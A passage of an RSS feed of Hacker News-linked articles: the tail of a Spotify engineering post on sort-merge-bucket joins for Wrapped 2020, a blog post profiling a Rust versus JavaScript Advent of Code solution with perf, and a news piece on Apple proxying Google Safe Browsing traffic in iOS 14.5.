runtime.</li></ul></li></ul>



<figure><img loading="lazy" width="700" height="459" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-700x459.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-700x459.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-250x164.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-768x504.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-120x79.png 120w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3.png 1115w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<ul><li><strong>SortedBucketTransform:</strong> A common usage pattern is for pipelines to enrich an existing dataset by joining it with one or more other sources, then writing it to an output location. We decided to specifically support this in SMB with a unique PTransform that reads, transforms, and writes output using the same keying and bucketing scheme. By doing the read/transform/write logic per bucket on the same worker, we can avoid having to reshuffle the data and recompute buckets ‚Äî since the key is the same, we know that the transformed elements from bucket M of the inputs also correspond to bucket M in the output, in the same sorted order as they were read from.</li></ul>



<figure><img loading="lazy" width="700" height="320" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-700x320.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-700x320.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-250x114.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-768x351.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-120x55.png 120w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4.png 902w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<ul><li><strong>External Sort:</strong> We made a number of improvements to Beam‚Äôs <a href="https://github.com/apache/beam/tree/master/sdks/java/extensions/sorter">external sorter extension</a>, including replacing the Hadoop sequence file with the native file I/O, removing the 2GB memory limit, and reducing disk usage and coder overhead.</li></ul>



<h2>Adoption ‚Äî Core Data Producers</h2>



<p>Since SMB requires data to be bucketed and sorted in a specific fashion, the adoption naturally starts from the producer of that data. A majority of the Spotify data processing relies on a few core data sets that act as single sources of truth for various business domains like streaming activities, user metadata and streaming context. We worked with the maintainer of these data sets to convert a year‚Äôs worth of data to SMB format.</p>



<p>Implementation was straightforward since SortedBucketSink is mostly a drop-in replacement for the vanilla Avro sink with some extra settings. We were using Avro sink with the sharding option to control the number and size of output files. After migrating to SMB, we did not notice any major bump in terms of vCPU, vRAM, or wall time since sharding requires a full shuffle similar to the additional cost of SMB sinks. A few other settings we have since had to tweak:</p>



<ul><li>Agree on user_id as a hexadecimal string as bucket and sort key, since we need the same key type and semantic across all SMB datasets.</li><li>Set compression to DEFLATE with level 6 to be consistent with the default Avro sink in Scio. As a nice side effect of data being bucketed and sorted by key, we observed ~50% reduction in storage from better compression due to collocation of similar records.</li><li>Make sure output files are backwards compatible. SMB output files have ‚Äúbucket-X-shard-Y‚Äù in their names but otherwise contain the same records with the same schema. So existing pipelines can consume them without any code change; they just do not leverage the speedup in certain join cases.</li></ul>



<h2>Adoption ‚Äî Wrapped 2020</h2>



<p>Once the core datasets were available in SMB format, we ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020">https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020</a></em></p>]]>
            </description>
            <link>https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-26111993</guid>
            <pubDate>Fri, 12 Feb 2021 09:44:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Performance Showdown: Rust vs Javascript (2020)]]>
            </title>
            <description>
<![CDATA[
Score 99 | Comments 102 (<a href="https://news.ycombinator.com/item?id=26111387">thread link</a>) | @KingOfCoders
<br/>
February 11, 2021 | https://cesarvr.io/post/rust-performance/ | <a href="https://web.archive.org/web/*/https://cesarvr.io/post/rust-performance/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>After spending some weeks playing with Rust, I felt ready to test my skills and try some programming challenges in the <a href="https://adventofcode.com/">Advent Of Code</a>. My approach to tackle some of those challenges was to solve them using Javascript (I use it in my day to day) first and then port the code to Rust. While writing the port I just focus on getting the Rust code as elegant as possible to achieve that I research the Rust API's to get syntactically correct. It was after finishing porting this <a href="https://adventofcode.com/2018/day/5">puzzle</a> in particular and feeling a sense of accomplishment that I decided to test how the Rust compiled code will perform against Javascript interpreter.</p><h2 id="naive-algorithm">Naive Algorithm</h2><hr><p>Before jumping to the whom-was-slower-and-why, let‚Äôs take a quick look at <a href="https://adventofcode.com/2018/day/5">puzzle</a> (so you see there is no hidden agenda) which goes like this:</p><p>You are given an input string with <code>N</code> amount of characters and we should write an algorithm that find and remove any sequential pairs of characters that similar but have different capitalisation, examples of this are:</p><div><pre><code data-lang="sh">bB <span># Remove</span>
bb <span># Do Nothing</span>
ab <span># Do Nothing</span>
</code></pre></div><p>The algorithm should re-evaluate the string recursively searching for new pairs created after the removal, something like tetris.</p><p>We have this input:</p><p>We should remove <code>bB</code> to get:</p><p>Then because <code>aA</code> has been formed we should eliminated this too:</p><p>Then we remove <code>dD</code> and the final string should be:</p><h3 id="my-solution">My Solution</h3><p>To solve this I wrote two functions, one that <code>process</code> takes array of characters, traverse the array a pair at a time and validate that they follow the rules mentioned above:</p><h4 id="rust">Rust</h4><hr><div><pre><code data-lang="rust"><span>fn</span> <span>process</span>(tokens: <span>&amp;</span><span>mut</span> Vec<span>&lt;</span>String<span>&gt;</span>) -&gt; <span>i32</span> {
  <span>let</span> <span>mut</span> polymer: Vec<span>&lt;</span>String<span>&gt;</span> <span>=</span> Vec::new();

  <span>while</span> <span>let</span> Some(token) <span>=</span> tokens.pop() {
      <span>if</span> polymer.is_empty() {
          polymer.push(token);
          <span>continue</span>;
      }

      <span>let</span> candidate <span>=</span> polymer.pop().unwrap();

      <span>if</span> <span>!</span>react(<span>&amp;</span>candidate, <span>&amp;</span>token) {
          polymer.push(candidate.to_string());
          polymer.push(token.to_string());
      }
  }

  polymer.len() <span>as</span> <span>i32</span>
}
</code></pre></div><h4 id="javascript">Javascript</h4><hr><div><pre><code data-lang="js"><span>function</span> <span>process</span>(<span>data</span>) {
  <span>let</span> <span>queue</span> <span>=</span> []  <span>// Save here tested characters.
</span><span></span>
  <span>while</span>(<span>data</span>.<span>length</span> <span>&gt;</span> <span>0</span>) {
    <span>let</span> <span>candidate_1</span> <span>=</span> <span>data</span>.<span>pop</span>()
    <span>let</span> <span>candidate_2</span> <span>=</span> <span>queue</span>.<span>pop</span>() <span>// get the last character that passed the test.
</span><span></span>
    <span>if</span> (<span>candidate_2</span> <span>===</span> <span>undefined</span>) {
      <span>queue</span>.<span>push</span>(<span>candidate_1</span>)
      <span>continue</span>
    }

    <span>let</span> <span>react</span> <span>=</span> <span>reacting</span>(<span>candidate_1</span>, <span>candidate_2</span>)

    <span>if</span>(<span>!</span><span>react</span>) {
      <span>queue</span>.<span>push</span>(<span>candidate_2</span>)
      <span>queue</span>.<span>push</span>(<span>candidate_1</span>)
    }
  }

  <span>return</span> <span>result</span>.<span>length</span>
}

</code></pre></div><blockquote><p><em>Notice</em> the <em>performance</em> optimization by keeping the last character in a different queue, that way we don‚Äôt need to traverse the whole array looking for matches after a previous removal.</p></blockquote><p>Then each pair of characters is evaluated using a function called <code>react</code> that returns <code>true</code> or <code>false</code> if the pair need to be removed:</p><h4 id="rust-1">Rust</h4><hr><div><pre><code data-lang="rust">
  <span>fn</span> <span>react</span>(token1: <span>&amp;</span>String, token2: <span>&amp;</span>String) -&gt; <span>bool</span> {
    <span>if</span> token1.to_lowercase() <span>=</span><span>=</span> token2.to_lowercase() {
        <span>return</span> token1 <span>!</span><span>=</span> token2
    }

    <span>false</span>
  }
</code></pre></div><h4 id="javascript-1">Javascript</h4><hr><div><pre><code data-lang="js"><span>function</span> <span>react</span>(<span>candidate_1</span>, <span>candidate_2</span>) {
  <span>if</span> (<span>candidate_1</span>.<span>toLowerCase</span>() <span>===</span> <span>candidate_2</span>.<span>toLowerCase</span>()) {
    <span>if</span> ( <span>candidate_1</span> <span>!==</span> <span>candidate_2</span> ) {
      <span>return</span> <span>true</span>
    }
  }

  <span>return</span> <span>false</span>
}
</code></pre></div><blockquote><p>Basically is a rudimentary implementation of an <strong>equals-ignore-case</strong> plus an additional check to see if they are they same character (the same capitalization).</p></blockquote><p>To complete the challenge each version (Rust, Javascript) needs to reduce a large string (<a href="https://adventofcode.com/2018/day/5/input">50K character</a>) which is good enough to test how well one version performs against the other, then I run each code using Linux <code>time</code> and got this:</p><div><pre><code data-lang="python"><span># Javascript (Node.js)</span>
  real  <span>0</span>m0<span>.</span><span>374</span>s
  user  <span>0</span>m0<span>.</span><span>301</span>s
  sys   <span>0</span>m0<span>.</span><span>030</span>s

<span># Rust</span>
  real  <span>0</span>m0<span>.</span><span>720</span>s
  user  <span>0</span>m0<span>.</span><span>636</span>s
  sys   <span>0</span>m0<span>.</span><span>012</span>s
</code></pre></div><p>This is a surprising turn of events, here we can see the Rust version is <code>2x</code> slower than Javascript, How? My first reaction (in an act of self denial) was to check the compiler flags <code>opt-level</code> and after checking that was fine, which to be honest won‚Äôt make a difference, I started to look for inefficiencies in the code, first using the ancient <a href="http://www.brendangregg.com/methodology.html">Drunk man anti-method</a> technique and when that didn‚Äôt work, I end up settling for a more scientific method of profiling my code with <a href="https://perf.wiki.kernel.org/index.php/Main_Page">perf</a>.</p><h2 id="debugging">Debugging</h2><hr><p>Every time you are debugging a performance issues you might feel tempted to start adding your own function to calculate the duration of suspicious section of code (like I used to do, in the past). <a href="http://www.brendangregg.com/perf.html">Perf</a> does this for you by taking various approaches such as listening to CPU/Kernel <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/developer_guide/perf">performance events</a> metrics emitted by the system in reaction of your process while running. Things like this makes perf the tool of choice to debug performance issues, so let‚Äôs see how it works.</p><h3 id="debugging-symbols">Debugging Symbols</h3><p>Before we start we need to enable the <a href="http://carol-nichols.com/2015/12/09/rust-profiling-on-osx-cpu-time/">debugging symbols</a> on the Rust compiler, this will make <code>perf</code> reports more informative. To enable this add <code>debug=true</code> to the <code>Cargo.toml</code>:</p><div><pre><code data-lang="toml">[<span>profile</span>.<span>release</span>]
<span>opt</span><span>-</span><span>level</span> = <span>3</span>
<span>debug</span>=<span>true</span>
</code></pre></div><h3 id="attaching-perf">Attaching Perf</h3><p>I recompiled the code and attached <code>perf</code>:</p><div><pre><code data-lang="zsh">cargo build
./target/release/day-5 &amp; perf record -F <span>99</span> -p <span>`</span>pgrep day-5<span>`</span>
</code></pre></div><ul><li>First we run the Rust program (<code>day-5</code>) and we send it to the background using the ampersand (<code>&amp;</code>) symbol.</li><li>Next to it, so it executes immediately, we run <code>perf</code> that receives the process identifier (<a href="https://en.wikipedia.org/wiki/Process_identifier">PID</a>) courtesy of <code>pgrep day-5</code>.</li><li>The <a href="https://linux.die.net/man/1/pgrep">pgrep</a> command returns the <a href="https://en.wikipedia.org/wiki/Process_identifier">PID</a> of a process by name.</li></ul><p>Here is the output:</p><div><pre><code data-lang="bash"><span>[</span>1<span>]</span> <span>27466</span>
sample size <span>50003</span>
--
solution 1: <span>9526</span>
solution 2: <span>6694</span>


<span>[</span> perf record: Woken up <span>1</span> times to write data <span>]</span>
<span>[</span>1<span>]</span>  + <span>27466</span> <span>done</span>       ./target/release/day-5
<span>[</span> perf record: Captured and wrote 0.002 MB perf.data <span>(</span><span>13</span> samples<span>)</span> <span>]</span>
</code></pre></div><h3 id="report">Report</h3><p>After running this multiple times,<code>perf</code> automatically aggregates the data to a report file (<code>perf.data</code>) in the same folder where we are making the call.</p><p>Now we can visualise the report with:</p><p><img src="https://raw.githubusercontent.com/cesarvr/hugo-blog/master/static/rust/perf-1.png" alt=""></p><p>Interestingly the algorithm spend <strong>30 percent</strong> of the time in the <a href="https://doc.rust-lang.org/std/string/struct.String.html#method.to_lowercase">String::to_lowercase</a> which is suspicious:</p><div><pre><code data-lang="rust"><span>fn</span> <span>react</span>(token1: <span>&amp;</span>String, token2: <span>&amp;</span>String) -&gt; <span>bool</span> {
    <span>if</span> token1.to_lowercase() <span>=</span><span>=</span> token2.to_lowercase() {  <span>// 30% CPU wasted here
</span><span></span>        <span>return</span> token1 <span>!</span><span>=</span> token2
    }

    <span>false</span>
}
</code></pre></div><p>My first impression is that I made a mistake while running <code>perf</code> (never used it before with Rust), but everything started to make sense once I looked at the source code of the <a href="https://doc.rust-lang.org/std/string/struct.String.html#method.to_lowercase">to_lowercase</a> function.</p><p>What happen is that Rust lowercase function try to be correct in any language, so it delegates this conversion to a function called <a href="https://doc.rust-lang.org/1.29.2/std_unicode/conversions/fn.to_lower.html">std_unicode::conversions</a> this function then does a <a href="https://en.wikipedia.org/wiki/Binary_search_algorithm">binary search</a> of each character against a big array (‚âà1200) of unicode characters:</p><div><pre><code data-lang="rust">
<span>const</span> to_lowercase_table: <span>&amp;</span>[(char, [char; <span>3</span>])] <span>=</span> <span>&amp;</span>[
        (<span>'\u{41}'</span>, [<span>'\u{61}'</span>, <span>'\0'</span>, <span>'\0'</span>]),
        (<span>'\u{42}'</span>, [<span>'\u{62}'</span>, <span>'\0'</span>, <span>'\0'</span>]),
        (<span>'\u{43}'</span>,<span>//...‚âà1200 ]
</span><span></span>

 <span>pub</span> <span>fn</span> <span>to_lower</span>(c: <span>char</span>) -&gt; [char; <span>3</span>] {
        <span>match</span> bsearch_case_table(c, to_lowercase_table) {
            None        <span>=</span><span>&gt;</span> [c, <span>'\0'</span>, <span>'\0'</span>],
            Some(index) <span>=</span><span>&gt;</span> to_lowercase_table[index].<span>1</span>,
        }
    }

</code></pre></div><blockquote><p>Going back at the code, this binary search is done twice per iteration now multiply this by <code>50K</code> and we found the reason for the slow down.</p></blockquote><p>After some googling I found that I should use <a href="https://doc.rust-lang.org/src/core/str/mod.rs.html#4006">eq_ignore_ascii_case</a> instead, which basically makes this operation in <a href="https://doc.rust-lang.org/1.37.0/src/core/slice/mod.rs.html#2487">linear time</a> and for one character is nearly the same as saying constant time. I recompiled the code and run the benchmarks:</p><div><pre><code data-lang="xml">Node.JS
real  0m0.374s
user  0m0.301s
sys   0m0.030s

Rust
real  0m0.283s
user  0m0.248s
sys   0m0.005s
</code></pre></div><p>Now we are talking, profiling has pay its dividends and made the Rust program <code>2.5x</code> <em>faster</em> than the original and <code>91ms</code> faster than the Javascript version, I can start celebrating and telling my friends that I‚Äôm a Rust expert now. But this leaves me with some questions:</p><blockquote><p>The <code>91ms</code> is not bad, but I wonder how much effort it will take to optimize this code to make it <code>&gt;1.5x</code> faster than the Javascript counterpart?</p></blockquote><h2 id="performance-on-macos">Performance On MacOS</h2><p>While I was thinking of this and was in the middle of unpacking my Rust stickers and preparing my laptop for some re-branding, I decided to move the code (Javascript and Rust) from my Linux VM to my main OS (<strong>MacOS Catalina</strong>), once there I gave the benchmark another try because I <em>love</em> suffering:</p><div><pre><code data-lang="sh">Node   0.17s user 0.03s system 101% cpu 0.209 total
Rust   0.23s user 0.01s system 98% cpu 0.238 total
</code></pre></div><p>After seeing this my confidence in my time measuring tool (<code>time</code>) started to fade a bit, but once I calm down and use the <a href="https://developer.apple.com/library/archive/documentation/AnalysisTools/Conceptual/instruments_help-collection/Chapter/Chapter.html">XCode Instrumentation</a> which point me in the right direction:</p><p><img src="https://github.com/cesarvr/hugo-blog/blob/master/static/rust/malloc-xcode-2.png?raw=true" alt=""></p><blockquote><p>The slowest part of the program (Rust version) is the part that does the allocation and deallocation of memory produced when calling MacOS <code>malloc</code>.</p></blockquote><p>To catch this one I'll need to dig more into Rust inner workings. Does this make it more expensive to get performance out of Rust? Did I choose the wrong abstractions? That's for another post. If you want to take a look at the code yourself here is the <a href="https://github.com/cesarvr/AOCRust/tree/master/day-5">Rust</a> and <a href="https://github.com/cesarvr/AOCRust/tree/master/JS">JS</a>, if you have any improvement, idea, suggestions or performance trick let me know by <a href="https://twitter.com/cvaldezr">Twitter</a>, <a href="https://github.com/cesarvr/AOCRust">pull request</a> or <a href="https://github.com/cesarvr/hugo-blog/issues">open an issue</a>.</p></div></div>]]>
            </description>
            <link>https://cesarvr.io/post/rust-performance/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26111387</guid>
            <pubDate>Fri, 12 Feb 2021 07:19:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple redirects Google Safe Browsing traffic through proxy servers in iOS 14.5]]>
            </title>
            <description>
<![CDATA[
Score 387 | Comments 261 (<a href="https://news.ycombinator.com/item?id=26110928">thread link</a>) | @CharlesW
<br/>
February 11, 2021 | https://the8-bit.com/apple-proxies-google-safe-browsing-privacy/ | <a href="https://web.archive.org/web/*/https://the8-bit.com/apple-proxies-google-safe-browsing-privacy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>

<p><strong>Update 1:58 AM PT:</strong> <em>Updated the post to clear confusion about how Google‚Äôs Safe Browsing feature works.</em></p>
<hr>
<p>Apple‚Äôs privacy push is much more widespread than it seems at the surface. A perfect example is the new privacy feature in <a href="https://the8-bit.com/ios-14-5-changes/">iOS 14.5 Beta 1 (V2)</a> which redirects Google Safe Browsing traffic through Apple‚Äôs own proxy servers to enhance users‚Äô privacy and to not let Google see your IP address. </p>
<p>Google Safe Browsing is a security service created by Google that checks whether a website is malicious. When you access a website on the desktop version of Chrome on your Mac or PC, for instance, Google Safe Browsing checks if a website is safe to browse and displays a warning accordingly. The user ultimately has the choice, however.</p>
<p>As Reddit user u/jaydenkieran explains, Apple uses Google Safe Browsing when you enable ‚ÄúFraudulent Website Warning‚Äù within the Safari settings in the Settings app on iPhone or iPad.</p>
<p><a aria-label="According to Google (opens in a new tab)" href="https://support.google.com/transparencyreport/answer/7380435?hl=en#zippy=%2Chow-do-you-determine-that-a-site-is-unsafe" target="_blank" rel="noreferrer noopener">According to Google</a>, its Safe Browsing system works by scanning sections of Google‚Äôs web index and ‚Äúidentifying potentially compromised websites.‚Äù Then, Google tests those websites by using a virtual machine to check if the website compromises the system. If it does, it‚Äôs added to Google‚Äôs online database. Google also identifies phishing websites by using statistical models. </p>
<p><a aria-label="According to Apple (opens in a new tab)" href="https://support.apple.com/en-ae/HT210675" target="_blank" rel="noreferrer noopener">According to Apple</a>, before visiting a website, Safari may send hashed prefixes of the URL (Apple terms it ‚Äúinformation calculated from the website address‚Äù) to Google Safe Browsing to check if there‚Äôs a match. </p>
<p>Since Apple uses a hashed prefix, Google cannot learn which website the user is trying to visit. Up until iOS 14.5, Google could also see the IP address of where that request is coming from. However, since Apple now proxies Google Safe Browsing traffic, it further safeguards users‚Äô privacy while browsing using Safari.</p>
<p>Apple has been intensifying its push for privacy with iOS 14 what with the <a href="https://the8-bit.com/app-tracking-transparency-guide/">App Tracking Transparency update and the inclusion of App Privacy Reports in the App Store</a>. </p><div><p>See also</p><div id="block-wrap-45850" data-id="45850" data-base="0"><div><div><div><article><div><p><a href="https://the8-bit.com/siri-now-allows-setting-a-default-music-streaming-service-on-ios-14-5/" title="Siri_Default_Music_App"><img width="100" height="100" src="https://the8-bit.com/wp-content/uploads/2021/02/Siri_Default_Music_App-100x100.jpg" alt="Siri Default Music App" srcset="https://the8-bit.com/wp-content/uploads/2021/02/Siri_Default_Music_App-100x100.jpg 100w, https://the8-bit.com/wp-content/uploads/2021/02/Siri_Default_Music_App-80x80.jpg 80w, https://the8-bit.com/wp-content/uploads/2021/02/Siri_Default_Music_App-293x293.jpg 293w" sizes="(max-width: 100px) 100vw, 100px"></a></p></div></article></div></div></div></div></div>
<p>At the same time, companies like Facebook are actively opposing the Cupertino giant, accusing it of negatively affecting the advertising industry. Apple‚Äôs response has been simple: </p>
<p>‚ÄúWe believe that this is a simple matter of standing up for our users. Users should know when their data is being collected and shared across other apps and websites ‚Äî and they should have the choice to allow that or not. App Tracking Transparency in iOS 14 does not require Facebook to change its approach to tracking users and creating targeted advertising, it simply requires they give users a choice.‚Äù </p>
<p>Google itself <a href="https://appleinsider.com/articles/21/02/04/google-still-hasnt-updated-its-ios-apps-while-pondering-android-privacy-controls" target="_blank" aria-label="had been holding off (opens in a new tab)" rel="noreferrer noopener">had been holding off</a> on updating its host of apps on the App Store due to the App Privacy Health Reports in the App Store that lets users view how an app tracks them. However, Google later disclosed that it will update its apps to include as little tracking as possible.</p>
<p>Having said that, it‚Äôs interesting to see Apple focus on enhancing user privacy as much as they can. And setting up a proxy server to filter Google Safe Browsing traffic just so Google cannot see users‚Äô browsing activity will be a welcome move for a lot of users.</p>
</div><!-- .entry-content -->
</div></div>]]>
            </description>
            <link>https://the8-bit.com/apple-proxies-google-safe-browsing-privacy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26110928</guid>
            <pubDate>Fri, 12 Feb 2021 05:07:03 GMT</pubDate>
        </item>
    </channel>
</rss>
